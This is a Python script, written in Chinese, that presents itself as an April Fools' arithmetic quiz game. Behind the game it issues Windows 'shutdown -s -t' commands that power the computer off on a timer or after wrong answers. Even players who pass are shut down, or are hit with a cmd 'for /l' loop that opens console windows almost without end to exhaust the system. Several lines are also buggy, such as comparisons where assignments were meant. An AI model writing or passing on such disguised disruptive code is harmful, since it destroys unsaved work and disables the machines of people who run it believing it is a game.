import os
import time
import random as r
t = 60

def no():
    print("\n")
    for i in range(0):
        print("愚人節快樂 \n")
        time.sleep(1)
        print("你沒了")
        time.sleep(1)
    chance=input("你還想要一次機會嗎(Y/N):_")
    if chance == "Y" or chance == "y":
        print("別灰心!繼續努力!")
    else:
        os.system('shutdown -s -t 50')
        for i in range(5,-1,-1):
            print("☠️你沒了，還有 %i秒☠️"%i)
            time.sleep(1)
def sd5():
    os.system('shutdown -s -t 5')
    for i in range(5,-1,-1):
        print("☠️你沒了，還有 %i秒☠️"%i)
        time.sleep(1)
        
def generate_math_question():
    num1 = r.randint(1, 1000)
    num2 = r.randint(1, 1000)
    operator = r.choice(['+', '-'])
    question = f"{num1} {operator} {num2}"
    answer = evaluate_expression(num1, num2, operator)
    return question, answer

def evaluate_expression(num1, num2, operator):
    if operator == '+':
        return num1 + num2
    elif operator == '-':
        return num1 - num2
    elif operator == '*':
        return num1 * num2

lv = input("歡迎來到愚人節闖關！\n你想要過......\n(1)輕鬆的愚人節\n(2)好玩的愚人節\n(3)刺激的愚人節\n這三個選一個：_")
if lv == "1":
    t == 120
elif lv == "2":	
    t == 90
elif lv == "3":
    t == r.randint(180,300)
    print("趕快存檔，你的電腦再幾分鐘（不知道是幾分鐘？）就要自己關機了！")
else:
    print("你在第一關就掛了XDDD")
    sd5()
    
os.system("shutdown -s -t %i" %t)
print("來快樂算數學吧！你還有%s秒"%t)

for i in range(3):
    question, answer = generate_math_question()
    print(f"{i+1}): {question}")
    user_answer = input("答案：")
    if user_answer == str(answer):
        print("Correct")
    else:
        print("是%s"%answer)
        no()
        for i in range(3):
            question, s_answer = generate_math_question()
            print(f"{i+1}): {question}")
            user_answer = input("答案：")
            if user_answer == str(answer):
                print("Correct")
            else:
                print("是%s，你在第一關就掛了"%answer)
                sd5()
                break

os.system('shutdown -a')
for i in range(2):
    time.sleep(1)
    print(".")
time.sleep(1)
print("👀")
for i in range(2):
    time.sleep(1)
    print(".")

print("前面選1的朋友抱歉啦！你過關了！但是你還是會拜拜~\n前面選2、3的朋友，你過關了，一樣也是會拜拜！但至少可以救一下（？")

for i in range(2):
    time.sleep(1)
    print(".")
time.sleep(1)
print("👀")
for i in range(2):
    time.sleep(1)
    print(".")

if lv == "1":
    sd5()

if lv == "2" or lv == "3":
    os.system('for /l %a in (1,1,948794879487) do (start "愚人節快樂")')

'''欸
不要偷看啦'''
